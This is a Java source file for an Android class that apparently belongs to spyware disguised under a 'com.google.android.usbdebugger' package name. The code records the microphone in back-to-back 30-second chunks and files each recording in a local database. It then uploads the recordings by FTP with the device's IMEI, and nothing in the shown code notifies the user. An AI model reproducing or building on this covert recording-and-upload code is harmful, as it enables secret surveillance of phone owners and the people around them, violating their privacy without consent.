package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.media.MediaRecorder;
import android.util.Log;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class Records {
    public boolean recordstatus;
    private MediaRecorder recorder;
    private DBHelper dbh;
    private SQLiteDatabase db;
    private String filePath = "";
    private Context context;
    private File aDir, aTempDir;
    private ArrayList Params;
    private String imeiNumber1;
    private boolean screenstastus;
    private int recordCount;


    public void Config(final Context contx, final File aTempDir2, final File aDir2, final ArrayList Params2,
                       final boolean screenstastus2, final String imeiNumber, final int recordCount2){
        context = contx;
        aDir = aDir2;
        aTempDir = aTempDir2;
        Params = Params2;
        screenstastus = screenstastus2;
        imeiNumber1 = imeiNumber;
        recordCount = recordCount2;
    }

    public void recordStart() {
        if (recordstatus) { // Prevent starting if already running
            return;
        }

        try {
            dbh = new DBHelper(context);
            db = dbh.getWritableDatabase();
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(256000);
            recorder.setAudioSamplingRate(128000);
            recorder.setMaxDuration(30000);


            @SuppressLint("SimpleDateFormat")
            SimpleDateFormat ft = new SimpleDateFormat("ddMMyyyyHHmmss");//HHddssMMmmyy
            Date dt = new Date();
            File newDtAudiofile = new File(aTempDir + "/" + ft.format(dt));
            @SuppressLint("SimpleDateFormat")
            SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
            final String daa = ft2.format(dt);

            dbh.insert_SrFiles(db,"tempAu", newDtAudiofile.getName(), daa, "1","", "0");
            filePath = newDtAudiofile.getAbsolutePath();
            recorder.setOutputFile(filePath);

            recorder.prepare();
            recorder.setOnInfoListener(new MediaRecorder.OnInfoListener() {
                @Override
                public void onInfo(MediaRecorder mr, int what, int extra) {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        recordStop(0); // Stop and process the current file
                        recordStart(); // Start the next recording
                    }
                }
            });
            recorder.start();
            recordstatus = true;
        } catch (Exception e) {
            Log.e("ERR1", "recordStart() failed definitively: " + e.getMessage());
            if (recorder != null) {
                try {
                    recorder.reset();
                    recorder.release();
                } catch (Exception e2) {
                    // Supress cleanup errors
                }
            }
            recorder = null;
            recordstatus = false;
        }
    }

    public void recordStop(int stat) {
        if (!recordstatus) { // if not recording, do nothing
            return;
        }

        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        String daa = ft2.format(dt);

        try {
            recorder.stop();
            recorder.reset();
            recorder.release();
            recorder = null;
            recordstatus = false;

            if (stat == 0) { // If it's a normal stop (not a hard shutdown)
                File fmove = new File(filePath);
                File fmove2 = new File(aDir + "/" + fmove.getName());
                if (fmove.exists()) {
                    try {
                        FileUtils.moveFile(fmove, fmove2);
                    } catch (IOException ex) {
                        if (dbh != null) dbh.insert_Exeption(db, "recordStop FileUtils.moveFile()","Exception", ex.getMessage(), daa);
                    }
                }
                if (dbh != null && !db.isOpen()) {
                    db = dbh.getWritableDatabase();
                }
                String[] SelFiles = dbh.Select_FileNames(db, "SrFiles", aDir, 1, "0");
                FTP_Sender.FTP(null, SelFiles, 1, 0, 0, Params, screenstastus,
                        imeiNumber1, context, recordCount, aDir);
            }
        } catch(Exception e){
            Log.e("ERR1", "recordStop failed: " + e.getMessage());
        }
    }
}
